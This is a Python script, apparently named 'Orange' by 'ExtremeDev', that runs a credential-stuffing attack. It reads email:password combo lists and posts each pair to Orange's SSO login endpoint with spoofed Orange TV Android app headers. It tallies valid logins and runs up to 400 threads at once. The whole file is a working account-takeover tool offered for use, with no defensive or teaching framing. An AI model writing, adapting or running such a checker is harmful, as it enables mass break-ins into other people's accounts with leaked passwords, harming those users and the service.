import requests
import random
import threading
import os
import time
import sys
import json
from re import search
from time import gmtime, strftime
time1 = strftime("%Y-%m-%d-%H-%M-%S", gmtime())
global emails
global passwords
emails = []
passwords = []
combolist = []
proxylist=[]
error=0
bad=0
good=0
cpm=0
cpm1=0
checked=0
banned=0
premium=0
free=0
num=0
clear = lambda: os.system('cls')
os.system("title Orange by ExtremeDev")
open("combos.txt", "a")

if not os.path.exists(f"results/nordvpn/{time1}/"):
    os.makedirs(f"results/nordvpn/{time1}/")
mesaje = ["yeah nobody else does it better", "i had to type it: IM SHY", "tedo da pedo", "Wrixty the 60", "legend was here", "0x72 gonna crack this tool"]
logo = """
 ██████╗ ██████╗  █████╗ ███╗   ██╗ ██████╗ ███████╗
██╔═══██╗██╔══██╗██╔══██╗████╗  ██║██╔════╝ ██╔════╝
██║   ██║██████╔╝███████║██╔██╗ ██║██║  ███╗█████╗  
██║   ██║██╔══██╗██╔══██║██║╚██╗██║██║   ██║██╔══╝  
╚██████╔╝██║  ██║██║  ██║██║ ╚████║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝
                                                    """


def load_accounts():
    with open('combos.txt','r', encoding='utf8') as f:
        for x in f.readlines():
            emails.append(x.split(":")[0].replace('\n',''))
            passwords.append(x.split(":")[1].replace("\n",''))


    
def ecran():
    global cpm,cpm1,error,good,bad,checked,premium,free
    cpm1=cpm
    cpm=0
    clear()
    print()
    print(logo)
    print()
    print("Coded by ExtremeDev - " + random.choice(mesaje))
    print()
    print(f"Checked: {checked}/{len(emails)}")
    print(f"Good: {good}")
    print(f"Bad: {bad}")
    print(f"Errors: {error}")
    print(f"CPM: {cpm1*60}")

    time.sleep(1)
    threading.Thread(target=ecran, args=(),).start()


def menu():
    clear()
    print()
    print(logo)
    print()
    print("Coded by ExtremeDev - " + random.choice(mesaje))
    print()
    print("Hello, welcome to Orange..")
    print("Where do you want to go?")
    print()
    print("[1] Orange checker")
    print("[2] Credits")
    print("[3] Quit")
    alegere_menu = input("->")
    if alegere_menu == "1":
        print()
    elif alegere_menu == "2":
        clear()
        print()
        print(logo)
        print()        
        print("Owner: ExtremeDev#6969")
        print()
        print("Author: ExtremeDev#6969")
        print()
        input("Press ENTER to go on menu")
        menu()
    elif alegere_menu == "3":
        print("We are closing..")
        time.sleep(3)
        sys.exit()
    else:
        print("Invalid input..")
        time.sleep(2)
        menu()
def checker(email, password):
    global error, good, bad, cpm, checked, banned, premium, free
    try:
        with requests.Session() as sess:

            url = "https://sso.orange.com/WT/userinfo/" 
            headers = {
                "content-type": "application/x-www-form-urlencoded",
                "User-Agent": "Orange TV_Android_7.2.0-2000_LG_LG-M700N_22_LL-Master3.9.5-1_HL-Sprint7.0.9-3",
                "Accept": "*/*",
                "Pragma": "no-cache",
                "X_OPENTV_PSE": "p_appliTV",
                "X_OPENTV_PE": "pe_appliTV",
                "X_OPENTV_ACTIVECONTEXT": "I",
                "X_OPENTV_PARENT_SESSION_ID": "APP-1804476f-d380-4059-abcc-c23aab59269d",
                "X_OPENTV_DID": "FB7C279E-0B89-E3C9-8503-3C1AEB89D309-DC7F2A58",
                "X-BEARER": "WIFI"

            }
            content = f"wt-email={email}&wt-pwd={password}&serv=OTVSDK&charset=utf_8&info=cooses&wt-cvt=4&wt-mco=MCO%3DOFR" 
            r = sess.post(url, headers=headers, data=content)
            if r.status_code == 403:
                bad+=1
                cpm+=1
                checked+=1
            elif "identifiers" in r.text:
                good+=1
                checked+=1
                cpm+=1
    except Exception:
        error+=1
        pass

load_accounts()
menu()

extremedev = "cute"
if extremedev == "cute":
    ecran()
    num = 0
    while 1:
        if threading.active_count() < 400:
            if len(emails) > num:
                threading.Thread(target=checker, args=(emails[num],passwords[num],)).start()
                num += 1
